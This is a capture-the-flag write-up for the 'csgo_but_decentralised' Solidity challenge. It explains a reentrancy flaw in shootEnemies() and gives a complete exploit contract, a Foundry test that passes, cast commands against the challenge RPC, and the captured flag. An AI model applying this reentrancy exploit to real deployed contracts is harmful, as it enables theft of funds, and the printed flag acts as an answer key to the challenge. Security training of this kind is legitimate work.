# csgo_but_decentralised [490 points]

### Description
```
20vs20, 1 bullet locked in, what could posssibly go wrong

csgo_but_decentralised.zip

Author: Ghast#0001

nc csgo_but_decentralised.blockchain.ctf.umasscybersec.org 31337
```

Our objective is to kill 20 enemies, each having 20 health, however only 20 players can be added in the team, each player only have 1 bullet

The `shootEnemies()` function does not follow checks-effects-interactions pattern and is vulnerable to reentrancy
```solidity
    function shootEnemies() public {
        require(guns[msg.sender] == true, "You have to pick up a gun");
        require(bullets[msg.sender] > 0, "You have ran out of bullets");

        for (uint i = 0; i < 20; i++) {
            if (enemies[i].isDead())
                continue;
            
            enemies[i].shoot();
            break;
        }

        require (bullets[msg.sender] - 1 < bullets[msg.sender], "Nice integer underflow");
        Player player = Player(msg.sender);
        player.handleRecoil();
        
        bullets[msg.sender] = 0;
    }
```

It call back to player, which we can call `shootEnemies()` again and the bullets mapping have not set to 0

There are 20 enemies each having 20 health, meaning we have to shoot 400 times in total, to avoid the gas usage exceeding the block gas limit, we can split it to 20 transactions as 20 players can be added to the team

Exploit.sol :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Chal.sol";

contract player {

    uint256 public shotsFired;

    constructor(address addr) {
        Chal(addr).grabGun();
    }

    function handleRecoil() external {
        shotsFired += 1;
        if (shotsFired < 20) {
            Chal(msg.sender).shootEnemies();
        }
    }

    function shoot(address addr) public {
        Chal(addr).shootEnemies();
    }
}

contract Exploit {

    function exploit(address addr) public {
        player p;
        p = new player(addr);
        p.shoot(addr);
    }
}
```

Deploy the exploit contract and call `exploit()` 20 times to solve the challenge, we can test in foundry first before actually running it on the network

Foundry test :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/Exploit.sol";

contract csgoHack is Test {
    Setup setup;
    Chal chal;
    Exploit exploit;
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        setup = new Setup();
        chal = setup.TARGET();
    }

    function testhack() public {
        vm.startPrank(hacker);
        exploit = new Exploit();
        
        for (uint i = 0; i < 20; i++) {
            exploit.exploit(address(chal));
        }
        console.log(setup.isSolved());
    }
}
```

Foundry test result :
```
# forge test -vv
[⠃] Compiling...
No files changed, compilation skipped

Running 1 test for test/test.t.sol:csgoHack
[PASS] testhack() (gas: 9639305)
Logs:
  true

Test result: ok. 1 passed; 0 failed; finished in 98.15ms
```

Then just deploy it on the network and get the flag

We can get the TARGET and check if it has been solved with foundry cast :
```
cast call 0x90fFfC79Bd8E203877122E5c76D2E7c123AB6b06 "isSolved()(bool)" --rpc-url http://csgo_but_decentralised.blockchain.ctf.umasscybersec.org:8545/1c90dc38-74e6-443e-8c7c-f8128eee8661

cast call 0x90fFfC79Bd8E203877122E5c76D2E7c123AB6b06 "TARGET()(address)" --rpc-url http://csgo_but_decentralised.blockchain.ctf.umasscybersec.org:8545/1c90dc38-74e6-443e-8c7c-f8128eee8661
```

```
# nc csgo_but_decentralised.blockchain.ctf.umasscybersec.org 31337
1 - launch new instance
2 - kill instance
3 - get flag
action? 3
ticket please: (choose a SECURE SECRET) REDACTED
This ticket is your TEAM SECRET. Do NOT SHARE IT!
UMASS{5h00t_t0_w1n_@mher5t}

for your safety, you should delete your instance now that you are done
```